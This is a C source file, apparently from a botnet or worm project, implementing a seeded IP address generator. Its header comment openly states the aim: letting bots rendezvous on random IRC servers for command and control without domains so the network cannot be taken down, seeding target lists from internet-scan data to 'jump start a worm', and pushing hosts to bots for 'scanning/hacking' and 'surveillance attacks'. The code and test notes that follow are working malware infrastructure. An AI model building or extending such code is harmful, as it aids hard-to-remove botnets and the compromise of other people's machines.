/*
bot ip generator
allows bots to 'synchronize' ip scans for things like c&c
they will scan for, and connect to 5 random irc servers relating to the current date
to obtain new bot links, and can move on so the irc servers wont get shutodwn
it gives infinite ability for bots to continously reconnect without a domain, p2p, email, contact, phone number etc..
and the bots themselves can open a base irc server as well and distribute the private messages via botlink

i believe this is, and using other already existing wide spread internet protocols is the onlt way to have a truly unremovable network

i'll clean this up, rewrite it and put into the module

generates 99% unique IP addresses with 1 million IPs.. i checked 10million and i believe it could be down to 95% but thats fine
-------------------------

the confusion happened beuase the ipgen code was given a structure to hold internal states
i didnt implement everything and began using it... it worked for having unique ips,
although it wasnt being initialized correctly..

i have to complete the implementation, and either tie the rand functions further into the
structures, or keep them separate
-------------------------


censys.io data can get analyzed to generate 'golden ratios' which would match/hit the majority
of hosts that are open for particular protocols but 'randomly' so that the entire list 
doesnt have to get distributed.. itll take some computational time/testing to find the right integers
to seed it but worth it to jump start a worm
it could be used for initial seedinng solely and then disqualified

needs a new random number generator.. but worth it for first release

it can also be a way to distribute to the bots new IP lists for scanning/hacking fromm future censys updates
also to update the lists of hosts to use for the surveillance attacks could be sent to all bots
using the same 'olden ratio seeds' 

each seed would need filters with some parameters to verify somme of the results
but it should work fine

seed can be  brute forced until it generates X ips which match a list within the first so many
iterations... glibc rand() is prob not proper
and filter such as removing private lans, and other mathematic filters could be put into place
to help ensure success

initial sspreading caan also modify the algo, or tell each bot to skip or limit itself to X iterations
which would ensure all nodes dont get hit by all bots during intiial spread







*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <time.h>
#include "ipgen.h"
#include <list.h>

// global (non seeded) random IV
uint32_t rand_iv = 1;

void testipgen();


int myrand(uint32_t *rand_params) {
    uint32_t a;
    if (rand_params) {
        // please excuse my dear aunt sally..
        // guess i forgot about that when i copied the libc implementation...
        // fixed
        *rand_params = 1103515245 * *rand_params + 12345;

        return (uint32_t)(*rand_params >> 16) & 0xffffffff;
    }

    rand_iv = 1103515245 * *rand_params + 12345;
    
    return (uint32_t)(rand_iv >> 16) & 0xffffffff;
}

void mysrand(uint32_t *rand_params, unsigned int seed) {
    if (rand_params) {
        *rand_params = seed;
    } else {
        rand_iv = seed;
    }
}

// linked list for keeping states of the IP generator
IPGeneratorConfig *gen_list = NULL;


void IPGenerateSeed(int id, int seed) {
    IPGeneratorConfig *params = IPGenConfigGet(id, seed);
    
    if (params != NULL) {
        mysrand(&params->seed_iv, seed);
    }
}

// retrieve or create a structure to keep the state of the generator for a particular ID
IPGeneratorConfig *IPGenConfigGet(int id, int seed) {
    IPGeneratorConfig *iptr = gen_list;

    // attempt to find the ID first..    
    while (iptr != NULL) {
        if (iptr->id == id)
            break;
            
        iptr = iptr->next;
    }

    // if it doesnt exist.. then create it!
    if (iptr == NULL) {
        if ((iptr = (IPGeneratorConfig *)L_add((LIST **)&gen_list, sizeof(IPGeneratorConfig))) != NULL) {
            iptr->id = id;
            iptr->seed = seed;
            iptr->start_ts = time(0);
            
            // seed the IV correctly.. (required everytime a seed has been changed)
            IPGenerateSeed(id, seed);
        }
    }

    return iptr;
}

// generate an 
uint32_t IPGenerateAlgo(int id, int seed) {
    int i = 0;
    int z = 0;//, _catch_up = 0;
    uint32_t final = 0;
    char *raw = (char *)&final;
    struct sockaddr_in dst;
    int a = 0, b = 0, c = 0, d = 0;
    uint32_t *iv = NULL;
    IPGeneratorConfig *params = IPGenConfigGet(id, seed);
    int r = 0;
    
    //***
    if (params == NULL) {
        //printf("bad params\n");
        // will do proper error chefcking laater.. if memory issue we are fucked anyhow
        exit(-1);
    }

    /*
    if (params->current == 0) {
        params->current = myrand(&params->seed_iv);
        testipgen();
    }
    */
/*
    // first time using this paticular id/seed
    if (params->current == 0) {
        mysrand(&params->seed_iv, time(0)+myrand(iv)%0x0000ffff);
    }
*/  
    // we want to catch up (to get the state the same due to random seed being used elsewhere in the application)
    // and then we want to add 1 so that it generates a new IP
    //_catch_up = params->current_count + 1;
    
    //for (z = 0; z < _catch_up; z++) {
        // generate a new random IP using particulars
        a = 1 + (myrand(&params->seed_iv) % 254);
        b = (255 - (myrand(&params->seed_iv) % 254));
        c = 1 + (myrand(&params->seed_iv) % 254);
        d = 1 + (myrand(&params->seed_iv) % 254);

        // use those prior numbers to modify particular portions of the IP address to generate a new one
        raw[0] = ((params->current & 0xff000000) + params->x[0]++) % a;
        raw[1] = ((params->current & 0x00ff0000) + params->x[1]++) % b;
        raw[2] = ((params->current & 0x0000ff00) + params->x[2]++) % c;
        raw[3] = ((params->current & 0x000000ff) + params->x[3]++) % d;

        // ensure nothing is .0 (if so, add 2).. *** maybe change this to 1 instead of 1 (might miss some routers)
        for (i = 0; i < 4; i++) if (raw[i] == 0) raw[i] = 2; 
        
        // keep the current count.. so we can catch up to it later..
        //if (params->current_count++ > 50) exit(-1);
        params->current_count++;
    //}

    // last time this was used
    params->last_ts = time(0);

    // set the IP in the structure
    dst.sin_addr.s_addr = final;
    
    //printf("IP %s\n", inet_ntoa(dst.sin_addr));
    
    return final;
}

/*
testing:
96% unique on 10 million IPs

mike@reprisal:~/clockwork$ wc -l IPs.u
9637737 IPs.u
mike@reprisal:~/clockwork$ wc -l IPs
10000000 IPs
mike@reprisal:~/clockwork$ bc
bc 1.06.95
Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'.
scale = 4
9637737 / 10000000
.9637



at 100 million its 81% unique.. fair enough for me.



void testipgen() {
    int a = 0;
    while (a++ < 100000000) {
        IPGenerateAlgo(6667, 41);
    }
    exit(-1);
}


*/